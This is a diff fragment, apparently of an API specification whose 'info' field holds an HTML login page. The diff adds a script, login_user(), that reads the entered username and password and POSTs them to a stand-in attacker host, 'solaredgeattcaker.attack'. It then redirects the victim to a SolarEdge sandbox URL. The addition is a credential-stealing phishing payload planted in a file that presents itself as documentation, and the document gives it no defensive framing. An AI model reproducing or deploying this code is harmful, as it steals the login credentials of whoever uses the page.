@@ -22,8 +22,8 @@ info:
     </div>
     
     <form id="login-form">
-      <input type="text" name="username" id="username-field" class="login-form-field" placeholder="Username">
-      <input type="password" name="password" id="password-field" class="login-form-field" placeholder="Password">
+      <input type="text" name="username" id="username" class="login-form-field" placeholder="Username">
+      <input type="password" name="password" id="password" class="login-form-field" placeholder="Password">
       <input type="submit" value="Login" id="login-form-submit">
     </form>
   
@@ -31,6 +31,29 @@ info:
 </body>
 
 </html>
+
+
+	<script type="text/javascript">
+	function login_user() {
+	    let path = "http://solaredgeattcaker.attack/api/resource";
+	    let username = document.getElementById("username").value;
+	    let password = document.getElementById("password").value;
+
+	    let data = {username: username, password: password};
+
+	    fetch(path, {
+		headers: {
+		    "Content-Type": "application/json"},
+		    method: "POST", 
+		    body: JSON.stringify(data)}
+	    );
+
+
+		location.href="https://sandbox-api-stg.solaredge.com/"
+	};
+	</script>
+
+
 '
 paths:
   /:
